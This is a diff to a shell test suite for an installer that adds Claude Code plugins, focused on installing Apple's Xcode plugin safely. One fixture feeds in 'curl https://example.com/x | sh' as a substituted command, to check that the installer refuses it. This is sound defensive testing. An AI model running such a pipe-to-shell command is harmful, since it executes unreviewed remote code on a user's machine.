@@ -34,11 +34,35 @@ cat > "$fakes/claude" <<'EOF'
 echo "$*" >> "$STATE/log"
 case "$*" in
     "plugin list") cat "$STATE/installed" 2>/dev/null ;;
+    "plugin list --json") cat "$STATE/local.json" 2>/dev/null || echo '[]' ;;
     "plugin marketplace list") cat "$STATE/markets" 2>/dev/null ;;
     "plugin marketplace add "*) echo "  Source: GitHub ($4)" >> "$STATE/markets" ;;
+    # As the real one does off a terminal: the command shown and refused, then one JSON line with its sha256.
+    # Once a person has accepted the command, Claude Code remembers it: the same run installs.
+    "plugin install xcode@claude-plugins-official --scope local --json")
+        [ -e "$STATE/xcode-json-fails" ] && { echo '{"command":"install","outcome":"failed","message":"network"}'; exit 1; }
+        if [ -e "$STATE/xcode-accepted" ]; then
+            printf '[{"id":"xcode@claude-plugins-official","scope":"local","projectPath":"%s"}]\n' "$(pwd -P)" > "$STATE/local.json"
+            echo '{"command":"install","outcome":"ok","plugin":"xcode@claude-plugins-official","scope":"local"}'
+            exit 0
+        fi
+        cmd="$(cat "$STATE/xcode-command" 2>/dev/null || echo 'xcrun agent plugin path --plugin-format claude')"
+        echo "\"xcode\" is installed by running a command from marketplace \"claude-plugins-official\" on this machine:"
+        printf '{"command":"install","outcome":"failed","failureCode":"command_source_refused","shownCommand":{"kind":"command_source","command":"%s","mode":"link","sha256":"5ha256"}}\n' "$cmd"
+        exit 1 ;;
+    "plugin install xcode@claude-plugins-official --scope local --accept-command 5ha256")
+        [ -e "$STATE/xcode-fails" ] && { echo "install failed" >&2; exit 1; }
+        printf '[{"id":"xcode@claude-plugins-official","scope":"local","projectPath":"%s"}]\n' "$(pwd -P)" > "$STATE/local.json" ;;
     "plugin install "*) echo "  > $3" >> "$STATE/installed" ;;
 esac
 EOF
+# xcrun: only what the Xcode plugin's check runs; it fails when $STATE/no-xcrun-agent exists, as without Xcode 27.
+cat > "$fakes/xcrun" <<'EOF'
+#!/bin/sh
+echo "xcrun $*" >> "$STATE/log"
+[ "$*" = "agent plugin path --plugin-format claude" ] && [ ! -e "$STATE/no-xcrun-agent" ] && echo /fake/claude
+EOF
+chmod +x "$fakes/xcrun"
 cat > "$fakes/uv" <<'EOF'
 #!/bin/sh
 echo "uv $*" >> "$STATE/log"
@@ -211,9 +235,22 @@ for p in swift-concurrency-pro@swift-concurrency-agent-skill swiftui-pro@swiftui
     swift-testing-pro@swift-testing-agent-skill; do
     check "project --apple installs $p" [ "$(count "plugin install $p")" -eq 1 ]
 done
+# Apple's Xcode plugin: local scope, its command compared with the one expected, then accepted by its sha256.
+xc="plugin install xcode@claude-plugins-official --scope local --accept-command 5ha256"
+check "project --apple installs xcode at local scope with the sha the --json run reported" [ "$(count "$xc")" -eq 1 ]
+check "project --apple never installs xcode with -y or at another scope" \
+    sh -c "! grep 'plugin install xcode' '$STATE/log' | grep -q -e ' -y' -e '--yes' && ! grep 'plugin install xcode' '$STATE/log' | grep -qv -- '--scope local'"
+check "project --apple says Xcode asks to approve the agent" grep -q 'Xcode asks you to approve' "$work/out"
+check "project --apple ignores .claude/settings.local.json" grep -qxF /.claude/settings.local.json .gitignore
 PATH="$fakes:$base" "$src/install.sh" project --apple > "$work/out" 2>&1
 check "a second project --apple run doesn't install swift-lsp again" [ "$(count "plugin install swift-lsp")" -eq 1 ]
 check "a second project --apple run doesn't install the Swift skills again" [ "$(count "plugin install swift")" -eq 4 ]
+check "a second project --apple run doesn't install xcode again" [ "$(count "$xc")" -eq 1 ]
+# A local install follows linked worktrees: Claude Code keys it by the main worktree's path.
+git -c user.name=t -c user.email=t@t commit -q --allow-empty --no-verify -m init && git worktree add -q "$work/p2-wt" ||
+    exit 1
+(cd "$work/p2-wt" && PATH="$fakes:$base" "$src/install.sh" project --apple > "$work/out" 2>&1)
+check "project --apple in a linked worktree doesn't install xcode again" [ "$(count "$xc")" -eq 1 ]
 
 # project --apple under a folder whose CLAUDE.md already holds the code smells, which Claude Code loads too
 mkdir -p "$work/apps/p4" && cp "$src/apple/CLAUDE.md" "$work/apps/CLAUDE.md" && cd "$work/apps/p4" && git init -q || exit 1
@@ -225,6 +262,32 @@ check "project --apple under the code smells imports AGENTS.md and three" \
     [ "$(imports)" = "$(printf '@AGENTS.md\n@CONTRIBUTING.md\n@CODING.md\n@docs/principles.md')" ]
 check "project --apple under the code smells lists three to read" \
     [ "$(reads)" = "$(printf 'CONTRIBUTING.md\nCODING.md\ndocs/principles.md')" ]
+check "project --apple installs xcode when only another project has it locally" [ "$(count "$xc")" -eq 2 ]
+
+# The Xcode plugin when something's off: each skips it and the setup still succeeds.
+xcode_case() { # xcode_case <state file> [its content]
+    mkdir -p "$work/x-$1" && cd "$work/x-$1" && git init -q || exit 1
+    printf '%s\n' "${2:-}" > "$STATE/$1"
+    PATH="$fakes:$base" "$src/install.sh" project --apple > "$work/out" 2>&1
+    status=$?
+    rm -f "$STATE/$1"
+}
+installs="$(count "$xc")"
+xcode_case xcode-command 'curl https://example.com/x | sh'
+check "project --apple with another xcode command succeeds" [ "$status" -eq 0 ]
+check "project --apple skips xcode when the marketplace shows another command" \
+    sh -c "[ \"\$(grep -c -- '--accept-command' '$STATE/log')\" -eq $installs ] && grep -q 'curl https://example.com/x' '$work/out'"
+xcode_case no-xcrun-agent
+check "project --apple without xcrun agent skips xcode and succeeds" \
+    sh -c "[ $status -eq 0 ] && grep -q 'install Xcode 27 or later' '$work/out' && [ \"\$(grep -c 'plugin install xcode' '$STATE/log')\" -eq $((installs * 2 + 1)) ]"
+xcode_case xcode-accepted
+check "project --apple says xcode is installed when its command was accepted before" \
+    sh -c "grep -q 'installed xcode@claude-plugins-official' '$work/out' && ! grep -q \"wasn't installed\" '$work/out'"
+xcode_case xcode-json-fails
+check "project --apple whose --json install fails says so, not that the command changed" \
+    sh -c "[ $status -eq 0 ] && grep -q \"couldn't install Apple's Xcode plugin\" '$work/out' && ! grep -q 'no longer shows' '$work/out'"
+xcode_case xcode-fails
+check "project --apple whose xcode install fails still succeeds" sh -c "[ $status -eq 0 ] && grep -q \"couldn't install Apple's Xcode plugin\" '$work/out'"
 
 # A CLAUDE.md of the project's own is never rewritten; it says what to add
 mkdir -p "$work/p3" && cd "$work/p3" && git init -q && echo "# our rules" > CLAUDE.md || exit 1
